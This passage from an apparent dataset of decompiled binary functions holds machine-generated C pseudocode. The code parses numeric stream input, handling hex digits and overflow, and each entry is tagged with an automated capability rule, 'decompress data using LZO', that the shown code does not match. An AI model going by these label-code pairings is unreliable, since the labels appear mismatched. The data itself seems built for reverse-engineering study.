}\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar15 = uVar17;\n                    if (uVar15 != 0xffff) goto code_r0x0044f166;\n                    arg_8h = NULL;\n                    if (stack0xffffffb0 < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0044f37d:\n                    if (5 < uVar15 - 0x61) goto code_r0x0044f540;\n                    iVar12 = uVar17 - 0x57;\n                    if (iVar12 == -1) break;\n                } while( true );\n            }\n            goto code_r0x0044f3a0;\n        }\n        var_4fh._2_1_ = 0;\n        var_42h = 0;\n        var_44h = 0;\n        uVar2 = uVar16;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar10 + 0x78;\n            var_4fh._2_1_ = 0;\n            var_44h = 0;\ncode_r0x0044f57f:\n            uVar18 = var_2ch;\n            iVar9 = uVar17;\n            if ((*(iVar10 + 0x10) == 0) || (*(iVar10 + 0x26) != iVar9)) {\n                if (iVar9 == *(iVar10 + 0x24)) goto code_r0x0044f3a0;\n                iVar3 = *piVar1;\n                piVar13 = piVar1;\n                uVar18 = stack0xffffffb0;\n                while (iVar3 != iVar9) {\n                    piVar13 = piVar13 + 1;\n                    uVar18 = uVar18 - 1;\n                    if (uVar18 == 0) goto code_r0x0044f3a0;\n                    iVar3 = *piVar13;\n                }\n                iVar12 = piVar13 - piVar1 >> 1;\n                if (0x1e < piVar13 - piVar1) {\n                    iVar12 = iVar12 + -6;\n                }\n                if (var_44h <= var_54h) {\n                    uVar15 = var_44h * var_40h;\n                    var_44h = iVar12 + uVar15;\n                    var_4fh._2_1_ = var_4fh._2_1_ | 0xffff - iVar12 < uVar15;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0044f5d2;\n                }\n                uVar18 = arg_8h[2];\n                var_4fh._2_1_ = uVar2;\n                if (uVar18 < arg_8h[3]) goto code_r0x0044f5e1;\ncode_r0x0044f6aa:\n                (**(*arg_8h + 0x28))();\n                uVar16 = uVar2;\n                if (arg_8h != NULL) goto code_r0x0044f5f0;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar10 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0044f22e;\n                }\n                uVar17 = var_2ch + 1;\n                uVar11 = 0xf;\n                if (stack0xffffffcc != var_58h) {\n                    uVar11 = var_28h;\n                }\n                if (uVar11 < uVar17) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar18) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0044f5d2:\n                uVar18 = arg_8h[2];\n                if (arg_8h[3] <= uVar18) goto code_r0x0044f6aa;\ncode_r0x0044f5e1:\n                arg_8h[2] = uVar18 + 2;\ncode_r0x0044f5f0:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar9 = *arg_8h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_8h + 0x24))();\n                }\n                uVar16 = 0;\n                if (iVar9 == -1) {\n                    arg_8h = NULL;\n                    uVar16 = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar8 = arg_10h != NULL && arg_14h == -1;\n            bVar5 = arg_14h == -1;\n            if (bVar8) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar9 = *arg_10h[2];\n                }\n                else {\n                    iVar9 = (**(*arg_10h + 0x24))();\n                }\n                bVar5 = false;\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    bVar5 = bVar8;\n                }\n            }\n            if (bVar5 == uVar16) goto code_r0x0044f22e;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0044f57f;\n        }\n        var_4fh._2_1_ = 0;\n        var_42h = 0;\n        var_44h = 0;\n        uVar2 = uVar16;\n    }\ncode_r0x0044f22e:\n    if (var_2ch != 0) goto code_r0x0044f3b2;\ncode_r0x0044f240:\n    if ((uVar19 != 0) || (bVar14)) {\ncode_r0x0044f41b:\n        if (var_42h == 0) {\n            if (var_4fh._2_1_ == 0) {\n                uVar15 = -var_44h;\n                if (!bVar4) {\n                    uVar15 = var_44h;\n                }\n                *arg_20h = uVar15;\n            }\n            else {\n                *arg_20h = 0xffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0044f263;\n        }\n    }\ncode_r0x0044f252:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0044f263:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_58h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0044f540:\n    if (5 < uVar15 - 0x41) goto code_r0x0044f3a0;\n    iVar12 = uVar17 - 0x37;\n    goto code_r0x0044f18a;\ncode_r0x0044f3a0:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0044f240;\ncode_r0x0044f3b2:\n    uVar17 = var_2ch;\n    uVar18 = var_2ch + 1;\n    uVar11 = 0xf;\n    if (stack0xffffffcc != var_58h) {\n        uVar11 = var_28h;\n    }\n    if (uVar11 < uVar18) {\n        fcn.00492830(var_2ch, 0, 0, 1);\n    }\n    *(stack0xffffffcc + uVar17) = uVar19;\n    *(stack0xffffffcc + uVar18) = 0;\n    var_2ch = uVar18;\n    cVar7 = fcn.0049e840(*(iVar10 + 8), *(iVar10 + 0xc), &var_31h + 1);\n    if (cVar7 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar14) || ((uVar19 | var_2ch) != 0)) goto code_r0x0044f41b;\n    goto code_r0x0044f252;\n}\n",
        "token_count": 5317
    },
    "0044fa60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0044fa60(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint *var_70h;\n    uint var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint32_t var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    char var_42h;\n    char var_41h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar7 = arg_18h;\n    iVar4 = fcn.0042e500(arg_18h + 0x6c);\n    uVar5 = *(iVar7 + 0xc) & 0x4a;\n    if (uVar5 == 0x40) {\n        var_50h = 8;\ncode_r0x0044faa0:\n        var_42h = fcn.00430e20(&arg_10h);\n        if (var_42h == '\\0') {\ncode_r0x0044fabc:\n            uVar11 = arg_ch & 0xffff;\n            if ((arg_8h != NULL) && (arg_ch == -1)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar11 = *arg_8h[2];\n                }\n                else {\n                    uVar11 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar11 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar2 = *(iVar4 + 0x10);\n            iVar3 = uVar11;\n            bVar15 = *(iVar4 + 0x70) == iVar3;\n            if ((((bVar15) || (*(iVar4 + 0x72) == iVar3)) && ((cVar2 == '\\0' || (*(iVar4 + 0x26) != iVar3)))) &&\n               (*(iVar4 + 0x24) != iVar3)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00430e20(&arg_10h);\n                if (var_42h == '\\0') {\n                    uVar11 = fcn.00430f10();\n                    cVar2 = *(iVar4 + 0x10);\n                    goto code_r0x0044fb60;\n                }\n                var_48h = 0;\n                var_41h = false;\n                cVar2 = *(iVar4 + 0x10);\n            }\n            else {\ncode_r0x0044fb60:\n                var_48h = 0;\n                var_41h = false;\n                do {\n                    iVar3 = uVar11;\n                    if ((cVar2 != '\\0') && (*(iVar4 + 0x26) == iVar3)) {\n                        var_42h = '\\0';\n                        if (var_50h != 0x10) goto code_r0x0044fc4d;\n                        var_28h = var_28h & 0xffffff00;\n                        var_54h = 0x16;\n                        goto code_r0x00450422;\n                    }\n                    if (*(iVar4 + 0x24) == iVar3) break;\n                    if (*(iVar4 + 0x78) == iVar3) {\n                        var_41h = var_50h == 10 | var_41h ^ 1U;\n                        if (var_41h == false) goto code_r0x0044fba2;\n                        bVar13 = var_50h == 8 || uVar5 == 0;\n                        if (var_50h != 8 && uVar5 != 0) {\n                            var_48h = var_48h + 1;\n                            goto code_r0x0044fbdb;\n                        }\n                        var_48h = 0;\n                        var_50h = 8;\n                        uVar12 = arg_8h[2];\n                        var_41h = bVar13;\n                        if (arg_8h[3] <= uVar12) {\n                            var_50h = 8;\n                            goto code_r0x0044ff00;\n                        }\ncode_r0x0044fbea:\n                        arg_8h[2] = uVar12 + 2;\ncode_r0x0044fbf9:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar3 = *arg_8h[2];\n                        }\n                        else {\n                            iVar3 = (**(*arg_8h + 0x24))();\n                        }\n                        bVar13 = false;\n                        if (iVar3 == -1) {\n                            arg_8h = NULL;\n                            bVar13 = true;\n                        }\n                    }\n                    else {\n                        if (var_41h == false) break;\ncode_r0x0044fba2:\n                        if ((*(iVar4 + 0x74) != iVar3) && (*(iVar4 + 0x76) != iVar3)) {\n                            var_42h = '\\0';\n                            var_41h = true;\n                            goto code_r0x0044fc41;\n                        }\n                        var_42h = var_50h == 0x10 || uVar5 == 0;\n                        if (var_50h != 0x10 && uVar5 != 0) {\n                            var_41h = true;\n                            goto code_r0x0044fc4d;\n                        }\n                        var_48h = 0;\n                        var_50h = 0x10;\n                        var_41h = false;\ncode_r0x0044fbdb:\n                        uVar12 = arg_8h[2];\n                        if (uVar12 < arg_8h[3]) goto code_r0x0044fbea;\ncode_r0x0044ff00:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044fbf9;\n                        bVar13 = true;\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar1 = arg_14h == -1;\n                    if (bVar9) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar3 = *arg_10h[2];\n                        }\n                        else {\n                            iVar3 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar1 = false;\n                        if (iVar3 == -1) {\n                            arg_10h = NULL;\n                            bVar1 = bVar9;\n                        }\n                    }\n                    if (bVar1 == bVar13) {\n                        var_42h = '\\x01';\n                        cVar2 = *(iVar4 + 0x10);\n                        goto code_r0x0044fc41;\n                    }\n                    uVar11 = 0xffff;\n                    if (arg_8h != NULL) {\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                        }\n                        if (uVar11 == -1) {\n                            arg_8h = NULL;\n                        }\n                    }\n                    cVar2 = *(iVar4 + 0x10);\n                } while (var_41h != false);\n                var_42h = '\\0';\n            }\ncode_r0x0044fc41:\n            var_54h = 0x16;\n            if (var_50h != 0x10) goto code_r0x0044fc4d;\n        }\n        else {\n            uVar11 = 0;\n            var_48h = 0;\n            var_41h = false;\n            cVar2 = *(iVar4 + 0x10);\n            bVar15 = false;\ncode_r0x0044fc4d:\n            var_54h = var_50h;\n        }\n        unique0x00001d00 = &var_28h;\n        var_2ch = 0;\n        var_28h = var_28h & 0xffffff00;\n        if (cVar2 != '\\0') {\ncode_r0x00450422:\n            stack0xffffffcc = &var_28h;\n            var_2ch = 0;\n            fcn.004924e0(0x20);\n        }\n        var_68h = 0;\n        var_64h = -0x80000000;\n        if (!bVar15) {\n            var_68h = 0xffffffff;\n            var_64h = 0x7fffffff;\n        }\n        uVar16 = fcn.00418980(var_68h, var_64h, var_50h, 0);\n        uVar5 = uVar16 >> 0x20;\n        if (*(iVar4 + 0xa4) == '\\0') {\n            if (var_42h == '\\0') {\n                bVar13 = false;\n                uVar12 = 0;\n                uVar14 = 0;\ncode_r0x0044fce4:\n                uVar10 = uVar11;\n                uVar11 = uVar11 & 0xffff;\n                if (var_54h < 0xb) {\n                    if ((uVar10 < 0x30) || (var_54h + 0x30U <= uVar10)) goto code_r0x0044ffc2;\n                }\n                else if (9 < uVar10 - 0x30) goto code_r0x0044ff9d;\n                uVar8 = uVar11 - 0x30;\ncode_r0x0044fd08:\n                if (uVar8 != 0xffffffff) {\n                    do {\n                        if (uVar5 < uVar14 || uVar5 - uVar14 < (uVar16 < uVar12)) {\n                            bVar13 = true;\n                            uVar11 = arg_8h[2];\n                            if (arg_8h[3] <= uVar11) goto code_r0x00450073;\ncode_r0x0044fd68:\n                            arg_8h[2] = uVar11 + 2;\ncode_r0x0044fd77:\n                            if (arg_8h[2] < arg_8h[3]) {\n                                iVar3 = *arg_8h[2];\n                            }\n                            else {\n                                iVar3 = (**(*arg_8h + 0x24))();\n                            }\n                            var_58h._0_1_ = false;\n                            if (iVar3 == -1) {\n                                arg_8h = NULL;\n                                var_58h._0_1_ = true;\n                            }\n                        }\n                        else {\n                            uVar11 = uVar12 * var_50h;\n                            uVar14 = (uVar12 * var_50h >> 0x20) + var_50h * uVar14;\n                            uVar12 = (var_64h - (uVar8 >> 0x1f)) - (var_68h < uVar8);\n                            bVar13 = bVar13 | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar8 < uVar11));\n                            uVar12 = uVar11 + uVar8;\n                            uVar14 = uVar14 + (uVar8 >> 0x1f) + CARRY4(uVar11, uVar8);\n                            var_48h = var_48h + 1;\n                            uVar11 = arg_8h[2];\n                            if (uVar11 < arg_8h[3]) goto code_r0x0044fd68;\ncode_r0x00450073:\n                            (**(*arg_8h + 0x28))();\n                            if (arg_8h != NULL) goto code_r0x0044fd77;\n                            var_58h._0_1_ = true;\n                        }\n                        arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                        bVar9 = arg_10h != NULL && arg_14h == -1;\n                        bVar1 = arg_14h == -1;\n                        if (bVar9) {\n                            if (arg_10h[2] < arg_10h[3]) {\n                                iVar3 = *arg_10h[2];\n                            }\n                            else {\n                                iVar3 = (**(*arg_10h + 0x24))();\n                            }\n                            bVar1 = false;\n                            if (iVar3 == -1) {\n                                arg_10h = NULL;\n                                bVar1 = bVar9;\n                            }\n                        }\n                        if (var_58h._0_1_ == bVar1) goto code_r0x0044fdb5;\n                        uVar11 = 0xffff;\n                        if (arg_8h == NULL) goto code_r0x0044fce4;\n                        if (arg_8h[2] < arg_8h[3]) {\n                            uVar11 = *arg_8h[2];\n                        }\n                        else {\n                            uVar11 = (**(*arg_8h + 0x24))();\n                        }\n                        uVar10 = uVar11;\n                        if (uVar10 != 0xffff) goto code_r0x0044fce4;\n                        arg_8h = NULL;\n                        if (var_54h < 0xb) break;\n                        uVar11 = 0xffff;\ncode_r0x0044ff9d:\n                        uVar8 = uVar11 - 0x57;\n                        if (uVar10 - 0x61 < 6) goto code_r0x0044fd08;\n                        if ((5 < uVar10 - 0x41) || (uVar8 = uVar11 - 0x37,  uVar8 == 0xffffffff)) break;\n                    } while( true );\n                }\n                goto code_r0x0044ffc2;\n            }\n            goto code_r0x0044fe91;\n        }\ncode_r0x004501a0:\n        var_50h._0_1_ = var_42h;\n        var_60h = uVar16 >> 0x20;\n        var_5ch = uVar16;\n        var_70h = &var_28h;\n        if (var_42h == '\\0') {\n            bVar13 = false;\n            uVar12 = 0;\n            uVar14 = 0;\ncode_r0x004501bb:\n            uVar5 = var_2ch;\n            iVar3 = uVar11;\n            if ((*(iVar4 + 0x10) == '\\0') || (*(iVar4 + 0x26) != iVar3)) {\n                piVar6 = iVar4 + 0x78;\n                uVar5 = var_54h;\n                if (iVar3 == *(iVar4 + 0x24)) goto code_r0x0044ffc2;\n                while (*piVar6 != iVar3) {\n                    uVar5 = uVar5 - 1;\n                    piVar6 = piVar6 + 1;\n                    if (uVar5 == 0) {\n                        var_50h._0_1_ = '\\0';\n                        goto code_r0x0044fdbc;\n                    }\n                }\n                iVar7 = piVar6 - (iVar4 + 0x78);\n                uVar11 = iVar7 >> 1;\n                uVar5 = uVar11 - 6;\n                if (iVar7 < 0x1f) {\n                    uVar5 = uVar11;\n                }\n                if (uVar14 <= var_60h && (var_5ch < uVar12) <= var_60h - uVar14) {\n                    uVar11 = uVar12 * var_50h;\n                    uVar14 = (uVar12 * var_50h >> 0x20) + var_50h * uVar14;\n                    uVar12 = (var_64h - (uVar5 >> 0x1f)) - (var_68h < uVar5);\n                    bVar13 = bVar13 | (uVar12 < uVar14 || uVar12 - uVar14 < (var_68h - uVar5 < uVar11));\n                    uVar12 = uVar11 + uVar5;\n                    uVar14 = uVar14 + (uVar5 >> 0x1f) + CARRY4(uVar11, uVar5);\n                    var_48h = var_48h + 1;\n                    goto code_r0x0045021d;\n                }\n                bVar13 = true;\n                uVar5 = arg_8h[2];\n                if (arg_8h[3] <= uVar5) goto code_r0x00450330;\ncode_r0x0045022c:\n                arg_8h[2] = uVar5 + 2;\ncode_r0x0045023b:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar3 = *arg_8h[2];\n                }\n                else {\n                    iVar3 = (**(*arg_8h + 0x24))();\n                }\n                var_58h._0_1_ = false;\n                if (iVar3 == -1) {\n                    arg_8h = NULL;\n                    var_58h._0_1_ = true;\n                }\n            }\n            else {\n                if (var_48h == 0) {\n                    var_50h._0_1_ = '\\0';\n                    var_42h = *(iVar4 + 0x10);\n                    goto code_r0x0044fdbc;\n                }\n                uVar11 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != var_70h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar11) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_48h = 0;\n                *(stack0xffffffcc + uVar5) = var_48h;\n                *(stack0xffffffcc + uVar11) = 0;\n                var_2ch = uVar11;\ncode_r0x0045021d:\n                uVar5 = arg_8h[2];\n                if (uVar5 < arg_8h[3]) goto code_r0x0045022c;\ncode_r0x00450330:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0045023b;\n                var_58h._0_1_ = true;\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar1 = arg_14h == -1;\n            if (bVar9) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar3 = *arg_10h[2];\n                }\n                else {\n                    iVar3 = (**(*arg_10h + 0x24))();\n                }\n                bVar1 = false;\n                if (iVar3 == -1) {\n                    arg_10h = NULL;\n                    bVar1 = bVar9;\n                }\n            }\n            if (bVar1 != var_58h._0_1_) {\n                uVar11 = 0xffff;\n                if (arg_8h != NULL) {\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar11 = *arg_8h[2];\n                    }\n                    else {\n                        uVar11 = (**(*arg_8h + 0x24))();\n                    }\n                    if (uVar11 == -1) {\n                        arg_8h = NULL;\n                    }\n                }\n                goto code_r0x004501bb;\n            }\ncode_r0x0044fdb5:\n            var_50h._0_1_ = '\\x01';\n        }\n        else {\n            uVar12 = 0;\n            uVar14 = 0;\n            bVar13 = false;\n            var_42h = '\\0';\n        }\n    }\n    else {\n        var_50h = 10;\n        if (uVar5 != 8) goto code_r0x0044faa0;\n        var_50h = 0x10;\n        cVar2 = fcn.00430e20(&arg_10h);\n        if (cVar2 == '\\0') goto code_r0x0044fabc;\n        unique0x00001d00 = &var_28h;\n        var_2ch = 0;\n        var_42h = *(iVar4 + 0x10);\n        var_28h = var_28h & 0xffffff00;\n        if (var_42h != '\\0') {\n            uVar11 = 0;\n            var_48h = 0;\n            var_41h = false;\n            bVar15 = false;\n            var_54h = 0x16;\n            goto code_r0x00450422;\n        }\n        var_42h = *(iVar4 + 0xa4);\n        bVar15 = false;\n        if (var_42h != '\\0') {\n            var_48h = 0;\n            uVar11 = 0;\n            var_41h = false;\n            uVar16 = 0x7ffffffffffffff;\n            var_68h = 0xffffffff;\n            var_64h = 0x7fffffff;\n            var_50h = 0x10;\n            var_54h = 0x16;\n            goto code_r0x004501a0;\n        }\n        var_48h = 0;\n        var_41h = var_42h;\ncode_r0x0044fe91:\n        uVar12 = 0;\n        uVar14 = 0;\n        bVar13 = false;\n        var_42h = '\\0';\n        var_50h._0_1_ = '\\x01';\n    }\ncode_r0x0044fdbc:\n    if (var_2ch == 0) goto code_r0x0044fdc4;\ncode_r0x0044ffd1:\n    fcn.004929c0(var_48h);\n    cVar2 = fcn.0049e840(*(iVar4 + 8), *(iVar4 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if (var_41h == '\\0') {\n        var_48h = var_48h | var_2ch;\n        goto joined_r0x0044fdd3;\n    }\ncode_r0x00450018:\n    if (var_42h == '\\0') {\n        if (bVar13) {\n            uVar5 = 0;\n            uVar11 = 0x80000000;\n            if (!bVar15) {\n                uVar5 = 0xffffffff;\n                uVar11 = 0x7fffffff;\n            }\n            *arg_20h = uVar5;\n            arg_20h[1] = uVar11;\n            *arg_1ch = 4;\n        }\n        else {\n            if (bVar15) {\n                bVar15 = uVar12 != 0;\n                uVar12 = -uVar12;\n                uVar14 = -(uVar14 + bVar15);\n            }\n            *arg_20h = uVar12;\n            arg_20h[1] = uVar14;\n        }\n        goto code_r0x0044fdf2;\n    }\n    goto code_r0x0044fdd9;\ncode_r0x0044ffc2:\n    var_50h._0_1_ = '\\0';\n    if (var_2ch != 0) goto code_r0x0044ffd1;\ncode_r0x0044fdc4:\n    if (var_41h == '\\x01') goto code_r0x00450018;\njoined_r0x0044fdd3:\n    if (var_48h != 0) goto code_r0x00450018;\ncode_r0x0044fdd9:\n    *arg_20h = 0;\n    arg_20h[1] = 0;\n    *arg_1ch = 4;\ncode_r0x0044fdf2:\n    var_70h = &var_28h;\n    if (var_50h != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_70h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 5812
    },
    "004505f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004505f0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    bool bVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int16_t *piVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint16_t uVar15;\n    uint32_t uVar16;\n    uint8_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    ulong uVar20;\n    uint var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar12 = arg_18h;\n    uVar18 = 8;\n    iVar8 = fcn.0042e500(arg_18h + 0x6c);\n    uVar9 = *(iVar12 + 0xc) & 0x4a;\n    if ((uVar9 != 0x40) && (uVar18 = 0x10,  uVar9 != 8)) {\n        uVar18 = 10;\n    }\n    bVar2 = arg_8h != NULL && arg_ch == -1;\n    bVar19 = arg_ch == -1;\n    if (bVar2) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar19 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar19 = bVar2;\n        }\n    }\n    bVar2 = arg_10h != NULL && arg_14h == -1;\n    bVar3 = arg_14h == -1;\n    if (bVar2) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar3 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar3 = bVar2;\n        }\n    }\n    if (bVar3 == bVar19) {\n        cVar5 = *(iVar8 + 0x10);\n        bVar2 = false;\n        uVar16 = 0;\n        var_48h._2_1_ = 1;\n        var_44h = 0;\n        bVar19 = false;\n    }\n    else {\n        uVar16 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar16 = *arg_8h[2];\n            }\n            else {\n                uVar16 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar16 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar5 = *(iVar8 + 0x10);\n        iVar7 = uVar16;\n        bVar2 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar2) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar5 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_48h._2_1_ = fcn.00430e20(&arg_10h);\n                if (var_48h._2_1_ != 0) {\n                    cVar5 = *(iVar8 + 0x10);\n                    var_44h = 0;\n                    bVar19 = false;\n                    goto code_r0x004507e9;\n                }\n                uVar16 = fcn.00430f10();\n                cVar5 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar2 = false;\n        }\n        var_44h = 0;\n        bVar19 = false;\n        do {\n            iVar7 = uVar16;\n            if ((cVar5 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_48h._2_1_ = 0;\n                if (uVar18 != 0x10) goto code_r0x004507f5;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x00450f20;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar3 = uVar18 == 10 | bVar19 ^ 1U;\n                if (!bVar3) goto code_r0x00450748;\n                bVar19 = uVar9 == 0 || uVar18 == 8;\n                if (uVar9 != 0 && uVar18 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x0045077e;\n                }\n                var_44h = 0;\n                uVar18 = 8;\n                uVar10 = arg_8h[2];\n                if (arg_8h[3] <= uVar10) goto code_r0x00450a20;\ncode_r0x0045078d:\n                arg_8h[2] = uVar10 + 2;\ncode_r0x0045079c:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._3_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._3_1_ = true;\n                }\n            }\n            else {\n                if (!bVar19) break;\ncode_r0x00450748:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_48h._2_1_ = 0;\n                    bVar19 = true;\n                    goto code_r0x004507e9;\n                }\n                var_48h._2_1_ = uVar18 == 0x10 || uVar9 == 0;\n                if (uVar18 != 0x10 && uVar9 != 0) {\n                    bVar19 = true;\n                    goto code_r0x004507f5;\n                }\n                var_44h = 0;\n                uVar18 = 0x10;\n                bVar3 = false;\ncode_r0x0045077e:\n                uVar10 = arg_8h[2];\n                bVar19 = bVar3;\n                if (uVar10 < arg_8h[3]) goto code_r0x0045078d;\ncode_r0x00450a20:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0045079c;\n                var_48h._3_1_ = true;\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar6 = arg_10h != NULL && arg_14h == -1;\n            bVar3 = arg_14h == -1;\n            if (bVar6) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar3 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar3 = bVar6;\n                }\n            }\n            if (var_48h._3_1_ == bVar3) {\n                cVar5 = *(iVar8 + 0x10);\n                var_48h._2_1_ = 1;\n                goto code_r0x004507e9;\n            }\n            uVar16 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < 